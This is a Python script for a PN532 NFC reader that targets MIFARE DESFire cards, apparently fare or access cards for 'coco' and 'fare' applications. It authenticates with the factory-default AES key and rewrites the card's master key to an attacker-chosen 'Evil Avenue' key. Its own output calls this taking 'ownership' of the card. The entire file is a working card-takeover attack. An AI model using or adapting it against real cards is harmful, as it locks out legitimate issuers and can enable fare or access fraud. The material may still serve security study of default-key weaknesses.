import board, busio, os, struct, zlib
from digitalio import DigitalInOut
from adafruit_pn532.spi import PN532_SPI
from Cryptodome.Cipher import AES

spi = busio.SPI(board.SCK, MOSI=board.MOSI, MISO=board.MISO)
cs = DigitalInOut(board.D8)
pn532 = PN532_SPI(spi, cs, debug=False)
pn532.SAM_configuration()

COCO_APP = [0xC0, 0xC0, 0xC0]
FARE_APP = [0x01, 0x00, 0x00]
DEFAULT = bytes(16)
EVIL_KEY = bytes.fromhex("REPLACE_WITH_YOUR_OWN_AES128_KEY")
KEY_VERSION = 0x01

def cmd(c, data=b""):
    payload = [0x01, c] + list(data)
    resp = pn532.call_function(0x40, params=payload, response_length=64)
    if resp is None or len(resp) < 2: return None, b""
    return resp[1], bytes(resp[2:])
def rotl(b): return b[1:]+b[:1]
def rotr(b): return b[-1:]+b[:-1]

def aes_auth(key, key_no=0):
    status, enc = cmd(0xAA, bytes([key_no]))
    if status != 0xAF or len(enc) < 16: return None
    enc = enc[:16]
    rndB = AES.new(key, AES.MODE_CBC, iv=bytes(16)).decrypt(enc)
    rndA = os.urandom(16)
    token = AES.new(key, AES.MODE_CBC, iv=enc).encrypt(rndA + rotl(rndB))
    status, enc2 = cmd(0xAF, token)
    if status != 0x00 or len(enc2) < 16: return None
    if rotr(AES.new(key, AES.MODE_CBC, iv=token[-16:]).decrypt(enc2[:16])) != rndA:
        return None
    return rndA[0:4]+rndB[0:4]+rndA[12:16]+rndB[12:16]

def crc_desfire(data):
    return struct.pack("<I", (zlib.crc32(data) & 0xFFFFFFFF) ^ 0xFFFFFFFF)

def change_key(sk, key_no, new_key, version):
    crc = crc_desfire(bytes([0xC4, key_no]) + new_key + bytes([version]))
    pt = new_key + bytes([version]) + crc
    while len(pt) % 16 != 0: pt += b"\x00"
    enc = AES.new(sk, AES.MODE_CBC, iv=bytes(16)).encrypt(pt)
    status, _ = cmd(0xC4, bytes([key_no]) + enc)
    return status

def identify():
    if cmd(0x5A, bytes(COCO_APP))[0] == 0x00: return "coco", COCO_APP
    if cmd(0x5A, bytes(FARE_APP))[0] == 0x00: return "fare", FARE_APP
    return "unknown", None

print("Tap a card to OWN it (change key to Evil Avenue key)...")
uid = pn532.read_passive_target(timeout=10)
if uid is None: print("No card."); exit()
print(f"Card UID: {bytes(uid).hex()}")

kind, app = identify()
print(f"Card type: {kind}")
if app is None:
    print("Unknown card, aborting."); exit()

# check if already owned
print("Checking current key...")
cmd(0x5A, bytes(app))
if aes_auth(EVIL_KEY) is not None:
    print(">>> Already owned (Evil Avenue key works). Nothing to do.")
    exit()

cmd(0x5A, bytes(app))
sk = aes_auth(DEFAULT)
if sk is None:
    print(">>> Can't auth with default key either. Card in unknown key state."); exit()

print("Authenticated with default. Changing key...")
status = change_key(sk, 0, EVIL_KEY, KEY_VERSION)
if status == 0x00:
    print(">>> KEY CHANGED - card is now OWNED by Evil Avenue key")
else:
    print(f">>> ChangeKey failed: 0x{status:02x}")
